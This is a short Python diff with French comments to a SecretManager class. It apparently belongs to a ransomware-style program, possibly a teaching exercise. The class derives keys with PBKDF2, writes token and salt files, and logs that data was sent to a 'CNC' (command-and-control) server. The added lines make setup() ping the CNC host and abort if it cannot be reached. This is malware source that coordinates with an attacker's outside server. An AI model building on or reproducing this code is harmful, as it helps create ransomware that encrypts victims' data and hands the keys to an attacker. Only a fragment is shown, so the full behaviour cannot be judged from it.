@@ -29,6 +29,7 @@ class SecretManager:
 
         self._log = logging.getLogger(self.__class__.__name__)
 
+
     def do_derivation(self, salt: bytes, key: bytes) -> bytes:
         kdf = PBKDF2HMAC(
             algorithm=hashes.SHA256(),
@@ -65,6 +66,14 @@ class SecretManager:
             self._log.info("Data sent to CNC successfully")
 
     def setup(self) -> None:
+        # tentative de connexion au CNC
+        try:
+            url = f"http://{self._remote_host_port}/ping"
+            response = requests.get(url)
+            if response.status_code != 200:
+                raise ConnectionError("Le CNC est injoignable")
+        except ConnectionError as e:
+            raise e
         # Vérification de l'existence d'un fichier self._token.bin
         if os.path.exists(os.path.join(self._path, "_token.bin")) or os.path.exists(os.path.join(self._path, "_salt.bin")):
             raise FileExistsError("Un fichier _token.bin existe déjà. Annulation du setup.")
